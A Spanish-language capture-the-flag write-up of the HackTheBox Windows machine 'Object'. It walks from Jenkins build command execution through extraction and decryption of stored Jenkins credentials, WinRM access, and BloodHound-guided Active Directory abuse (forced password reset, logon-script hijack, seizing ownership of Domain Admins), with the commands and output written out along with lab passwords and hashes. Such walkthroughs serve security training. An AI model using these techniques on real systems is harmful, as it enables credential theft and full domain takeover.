---
title: HackTheBox - Máquina Object 
subtitle: Paso a paso de la explotación de la maquina Object de HackTheBox.
dificultad: Hard
os: Sistema Operativo Windows
date: 2024-02-10
tags:
    - HackTheBox
---

## Port Enumeration

### TCP 

Enumeración de puertos TCP

~~~ bash
sudo nmap -sS -p80,5985,8080 10.129.96.147 -A -Pn             
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 18:18 EDT
Nmap scan report for 10.129.96.147
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-title: Mega Engines
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp open  http    Jetty 9.4.43.v20210629
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.43.v20210629)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   126.52 ms 10.10.14.1
2   126.92 ms 10.129.96.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.22 seconds

~~~

    

### UDP
  
 Enumeración de UDP
 
~~~ bash
sudo nmap -sU -F 10.129.96.147 -T5                
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 18:19 EDT
Nmap scan report for 10.129.96.147
Host is up (0.13s latency).
Not shown: 98 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp

Nmap done: 1 IP address (1 host up) scanned in 4.44 seconds

~~~

## Enumeracion de Servicios   

### HTTP port 80:

La enumeración con Gobuster dio como resultado que no existen otros directorios ni dominios adicionales

Banner Grabbing

~~~http
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Tue, 26 Oct 2021 06:21:32 GMT
Accept-Ranges: bytes
ETag: "61128db831cad71:0"
Server: Microsoft-IIS/10.0
Date: Mon, 20 Jun 2022 21:11:13 GMT
Connection: close
Content-Length: 29932
~~~

![](/Object/Pasted_image_20220620182027.png)

Ingresamos al link automation

Y nos redirige al dominio object.htb:8080. Por lo que agregamos el dominio /etc/hosts

Luego de agregar el dominio al archivo /etc/hosts ingresamos nuevamente a la aplicación web en puerto 8080

![](/Object/Pasted_image_20220620182300.png)

Contenido del archivo robots.txt

~~~ bash
# we don't want robots to click "build" links
User-agent: *
Disallow: /
~~~

Creamos un usuario y logramos ingresar al sistema

![](/Object/Pasted_image_20220620182550.png)

## Vulnerabilities analysis

La siguiente página nos indica que es posible ejecutar comandos en el sistema mediante la creación de builds

[Vulnerabilidades en Jenkins](https://book.hacktricks.xyz/cloud-security/jenkins)

Creamos un nuevo proyecto 

Vamos a la sección de triggers

Y configuramos lo siguiente

![](/Object/Pasted_image_20220621071436.png)

Esto lo hacemos para que se ejecute el Build donde ingresaremos nuestro comando

En Build presionamos sobre el botón Add build step y seleccionamos Execute Windows batch command. Luego, agregamos lo siguiente:

![](/Object/Pasted_image_20220621071556.png)

Esperamos unos minutos y vemos el resultado

![](/Object/Pasted_image_20220621071328.png)

El software está ejecutandose como el usuario oliver

# Explotation

Intentaremos verificar que el sistema no tiene habilitado algun firewall

![](/Object/Pasted_image_20220621072459.png)

Con python creamos un servidor http a la esucha y vemos si es posible la conexión

![](/Object/Pasted_image_20220621072512.png)

Comenzamos a enumera el sistema y extraer alguna información que nos sea util 

Enumeramos los directorios

![](/Object/Pasted_image_20220621073347.png)

Luego consultamos el directorio C:\Users\oliver\AppData\Local\Jenkins\.jenkins

![](/Object/Pasted_image_20220621073716.png)


Según el siguiente sitio: [Stack overflow](https://stackoverflow.com/questions/52930545/what-is-the-purpose-of-the-jenkins-user-folder-and-what-are-these-config-files)

El archivo config.xml del directorio users contiene información de los usuarios del sistema. Por lo que intentaremos acceder al contenido del archivo.

~~~
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\leftraro_9491939160013366012\config.xml
~~~


~~~xml
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>leftraro</id>
  <fullName>leftraro</fullName>
  <properties>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.6.1">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.84">
      <triggers/>
    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.5">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>0a9baf906da7ec2b</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$Y4W8YbX0jiPJDGgfKcnhauOpdZ84NoaZeI/HP76dSqxQTxzShlHqO</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.34">
      <emailAddress>leftraro@asdas.cl</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1655809043400</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>
~~~

Luego consultamos el del usuario admin

~~~
type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\
~~~

~~~xml
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.6.1">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        <entry>
          <com.cloudbees.plugins.credentials.domains.Domain>
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
              <description></description>
              <username>oliver</username>
              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
              <usernameSecret>false</usernameSecret>
            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          </java.util.concurrent.CopyOnWriteArrayList>
        </entry>
      </domainCredentialsMap>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.84">
      <triggers/>
    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.5">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>ea75b5bd80e4763e</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.34">
      <emailAddress>admin@object.local</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1634793332195</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>
~~~

Para extraer las contraseñas podemos utilizar el siguiente script en python


Debemos descargar dos archivos 

- master.key 
- hudson.util.Secret

Como este ultimo es un binario, lo convertiremos a base64 y luego lo decodificaremos y guardaremos en nuestro sistema:

~~~
powershell -c [convert]::ToBase64String((cat C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret -Encoding byte))
~~~

hudson.util.Secret

~~~
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
~~~

master.key

~~~
ZjY3M2ZkYjBjNGZjYzMzOTA3MDQzNWJkYmUxYTAzOWQ4M2E1OTdiZjIxZWFmYmI3ZjliMzViNTBmY2UwMDZlNTY0Y2ZmNDU2NTUzZWQ3M2NiMWZhNTY4YjY4YjMxMGFkZGM1NzZmMTYzN2E3ZmU3MzQxNGE0YzZmZjEwYjRlMjNhZGM1MzhlOWIzNjlhMGM2ZGU4ZmMyOTlkZmEyYTM5MDRlYzczYTI0YWE0ODU1MGIyNzZiZTUxZjkxNjU2Nzk1OTViMmNhYzAzY2MyMDQ0ZjNjNzAyZDY3NzE2OWUyZjRkM2JkOTZkODMyMWEyZTE5ZTJiZjBjNzZmZTMxZGIxOQ==
~~~

Descodificamos los archivo y ejecutamos el script:

~~~bash
python decrypt.py master.key hudson.util.Secret config.xml
c1cdfun_d2434
~~~

## Getting a shell

Ahora con las credenciales del usuario oliver podemos usar el servicio WinRM

- User: oliver
- Password: c1cdfun_d2434

~~~ bash
evil-winrm -i 10.129.90.135 -u oliver -p c1cdfun_d2434

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\oliver\Documents> whoami
object\oliver
*Evil-WinRM* PS C:\Users\oliver\Documents> 

~~~

## System Enumeration

Usuarios del sistema

~~~ bash
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/10/2021   3:20 AM                Administrator
d-----       10/26/2021   7:59 AM                maria
d-----       10/26/2021   7:58 AM                oliver
d-r---        4/10/2020  10:49 AM                Public
d-----       10/21/2021   3:44 AM                smith

~~~

Servicios que esten a la esucha en algun puerto

~~~bash
*Evil-WinRM* PS C:\Users> netstat -ano | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       900
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       900
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5644
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2796
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       484
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1160
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1520
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:49695          0.0.0.0:0              LISTENING       2928
  TCP    0.0.0.0:62258          0.0.0.0:0              LISTENING       2872
  TCP    10.129.90.135:53       0.0.0.0:0              LISTENING       2928
  TCP    10.129.90.135:139      0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2928
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:88                [::]:0                 LISTENING       648
  TCP    [::]:135               [::]:0                 LISTENING       900
  TCP    [::]:389               [::]:0                 LISTENING       648
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       648
  TCP    [::]:593               [::]:0                 LISTENING       900
  TCP    [::]:636               [::]:0                 LISTENING       648
  TCP    [::]:3268              [::]:0                 LISTENING       648
  TCP    [::]:3269              [::]:0                 LISTENING       648
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8080              [::]:0                 LISTENING       5644
  TCP    [::]:9389              [::]:0                 LISTENING       2796
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       484
  TCP    [::]:49665             [::]:0                 LISTENING       1160
  TCP    [::]:49666             [::]:0                 LISTENING       1520
  TCP    [::]:49667             [::]:0                 LISTENING       648
  TCP    [::]:49673             [::]:0                 LISTENING       648
  TCP    [::]:49674             [::]:0                 LISTENING       648
  TCP    [::]:49684             [::]:0                 LISTENING       628
  TCP    [::]:49695             [::]:0                 LISTENING       2928
  TCP    [::]:62258             [::]:0                 LISTENING       2872
  TCP    [::1]:53               [::]:0                 LISTENING       2928
  TCP    [dead:beef::84]:53     [::]:0                 LISTENING       2928
  TCP    [dead:beef::eddf:29ac:70d6:2b4b]:53  [::]:0                 LISTENING       2928
  TCP    [fe80::eddf:29ac:70d6:2b4b%12]:53  [::]:0                 LISTENING       2928

~~~

Al parecer es una Servidor Active Directory

Subimos el archivo SharpHound.ps1 para buscar vectores de ataque:

~~~bash
PS C:\Users\oliver\Desktop> upload /home/kali/HTB/machines/res/SharpHound.ps1
Info: Uploading /home/kali/HTB/machines/res/SharpHound.ps1 to C:\Users\oliver\Desktop\SharpHound.ps1

                                                             
Data: 1298980 bytes of 1298980 bytes copied

Info: Upload successful!

~~~

Luego lo ejecutamos:

~~~bash
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
~~~

Revisamos loa archivos creados

~~~bash
ls


    Directory: C:\Users\oliver\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2022   6:40 AM           9060 20220621064046_BloodHound.zip
-a----        6/21/2022   6:40 AM          10043 MWU2MmE0MDctMjBkZi00N2VjLTliOTMtYThjYTY4MjdhZDA2.bin
-a----        6/21/2022   6:35 AM         974235 SharpHound.ps1
-ar---        6/21/2022   4:56 AM             34 user.txt

~~~

Descargamos el archivo .zip

## Elevación de privilegios

Lo importamos en bloodhound y luego buscamos el path mas corto para llegar a admin

![](/Object/Pasted_image_20220621111052.png)

- Desde oliver a smith forcechangepassword
- Desde smith a maria GenericWrite
- Desde maria a Administrador WriteOwner

Para entender como explotar el cambio de contraseña para el usuario smith presionamos click derecho sobre ForceChangePassword

![](/Object/Pasted_image_20220621111719.png)

![](/Object/Pasted_image_20220621111731.png)

## Consiguiendo el usuario Smith 

Nos sugiere instalar powerview y hacer el cambio de contraseña con esta herramienta:

~~~powershell
 . .\powerview.ps1
~~~
Luego ejecutamos los siguientes comandos:

~~~powershell
$newpass = ConvertTo-SecureString 'Password1234#' -AsPlainText -Force
~~~

~~~powershell
Set-DomainUserPassword -Identity smith -AccountPassword $newpass
~~~

Ahora el usuario smith posee las siguientes credenciales

- User: smith
- Password: Password1234#

Verificamos si tenemos acceso al sistema mediante WinRM con el usuario smith

~~~powershell
evil-winrm -i 10.129.90.135 -u smith -p 'Password1234#'                            

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: [Evil-WinRM](https://github.com/Hackplayers/evil-winrm#Remote-path-completion
)
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\smith\Documents> 
~~~

## Consiguiendo el usuario Maria

Para conseguir acceso al usuario maria, Bloodhound nos sugiere utilizar nuevamente el modulo powerview.ps1 junto con sus componentes Set-DomainObject y Get-DomainSPNTicket

Sin embargo, el ataque no fue exitoso, Hacktricks sugiere que se puede usar el GenericWrite para modificar los script de logon.

[ACL Pesistence Abuse](https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user)

Por lo que usamos los siguientes comandos

~~~powershell 
echo "ls \users\maria > c:\tmp\out" > cmd.ps1
~~~

~~~powershell
Set-DomainObject -Identity maria -SET @{scriptpath="C:\\tmp\\cmd.ps1"}
~~~

Luego leemos el archivo out y vemos lo siguiente

~~~powershell
type out


    Directory: C:\users\maria


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       10/22/2021   3:54 AM                3D Objects
d-r---       10/22/2021   3:54 AM                Contacts
d-r---       10/25/2021   3:47 AM                Desktop
d-r---       10/25/2021  10:07 PM                Documents
d-r---       10/22/2021   3:54 AM                Downloads
d-r---       10/22/2021   3:54 AM                Favorites
d-r---       10/22/2021   3:54 AM                Links
d-r---       10/22/2021   3:54 AM                Music
d-r---       10/22/2021   3:54 AM                PictuObject
d-r---       10/22/2021   3:54 AM                Saved Games
d-r---       10/22/2021   3:54 AM                Searches
d-r---       10/22/2021   3:54 AM                Videos
~~~

Notamos que el directorio Documents ha sifo modificado recientemente

~~~powershell
echo "ls \users\maria\desktop > \tmp\out " > cmd.ps1
~~~
 
 Y conseguimos el siguiente archivo
 
~~~powershell
cat out

Directory: C:\users\maria\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/26/2021   8:13 AM           6144 Engines.xls

 ~~~

Modificamos el archivo cmd.ps1:

~~~powershell
echo "copy \users\maria\desktop\Engines.xls  \tmp\ " > cmd.ps1
~~~


~~~powershell
ls


    Directory: C:\tmp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2022   8:03 AM             96 cmd.ps1
-a----       10/26/2021   8:13 AM           6144 Engines.xls
-a----        6/21/2022   8:02 AM            830 out
-a----        6/21/2022   7:59 AM            830 out2

~~~


Descargamos el archivo a nuestra VM. Luego convertimos el archivo a csv

~~~bash
ssconvert Engines.xls engine.csv
~~~

Y vemos su contenido

~~~bash
cat engine.csv                           
"Machines Information",,,,,
Name,Quantity,"Date Acquired",Owner,"Chamber Username","Chamber Password"
"Internal Combustion Engine",12,2021/10/02,HTB,maria,d34gb8@
"Stirling Engine",23,2021/11/05,HTB,maria,0de_434_d545
"Diesel Engine",4,2021/02/03,HTB,maria,W3llcr4ft3d_4cls
~~~

Intentamos acceder al sistema mediante WinRM como el usuario maria utilizando las contraseñas indicadas en el CSV

## Administrador

BloodHound nuevamente nos sugiere instalar el modulo PowerView para luego modificar  el grupo de administradores y hacer que maria sea parte de este grupo

Definimos a maria como el dueño del grupo Domain Admins

~~~powershell
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
~~~

Asiganmos todos los derechos del grupo a maria

~~~powershell
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All
~~~

Agregamos a maria al grupo Domain Admins

~~~powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
~~~

Verificamos a que grupos pertenece maria

~~~powershell
*Evil-WinRM* PS C:\Users\maria\Documents> net user maria
User name                    maria
Full Name                    maria garcia
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/21/2021 9:16:32 PM
Password expires             Never
Password changeable          10/22/2021 9:16:32 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 C:\\tmp\\cmd.ps1
User profile
Home directory
Last logon                   6/21/2022 4:56:41 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Admins        *Domain Users
The command completed successfully.
~~~

Finalmente tenemos acceso como Administrador al sistema